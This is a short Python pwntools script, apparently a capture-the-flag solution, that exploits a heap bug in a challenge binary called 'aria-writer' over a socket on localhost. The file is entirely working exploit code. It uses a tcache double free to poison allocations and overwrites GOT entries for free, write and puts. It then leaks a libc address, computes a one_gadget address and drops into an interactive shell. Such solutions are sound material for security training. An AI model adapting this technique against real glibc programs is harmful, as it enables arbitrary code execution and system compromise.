from pwn import *
context.binary = elf = ELF('./aria-writer', checksec=False)
libc = ELF('./libc-2.27.so', checksec=False)

s = remote('localhost', 10000)

def malloc(size, data):
    s.sendlineafter('> ', '1')
    s.sendlineafter('> ', str(size))
    s.sendlineafter('> ', data)

def free():
    s.sendlineafter('> ', '2')

def secret():
    s.sendlineafter('> ', '3')

s.sendlineafter('whats your name > ', '/bin/sh\0')
malloc(0x20, 'a')
free()
free()
malloc(0x20, pack(elf.got.free))
malloc(0x20, pack(elf.got.free))

malloc(0x30, 'a')
free()
free()
malloc(0x30, pack(elf.symbols['global']))
malloc(0x30, pack(elf.symbols['global']))

malloc(0x40, 'a')
free()
free()
malloc(0x40, pack(elf.got.write))
malloc(0x40, pack(elf.got.write))

# libc leak
malloc(0x20, pack(elf.plt.puts))
malloc(0x30, pack(elf.got.puts))
free()
s.recvline()
puts = unpack(s.recvline()[:-1].ljust(8, b'\00'))

libc.address = puts - libc.symbols.puts
print('libc_base:', hex(libc.address))

one_gadget = libc.address + 0x10a38c
malloc(0x40, pack(one_gadget))
s.sendlineafter('> ', '3')

s.interactive()
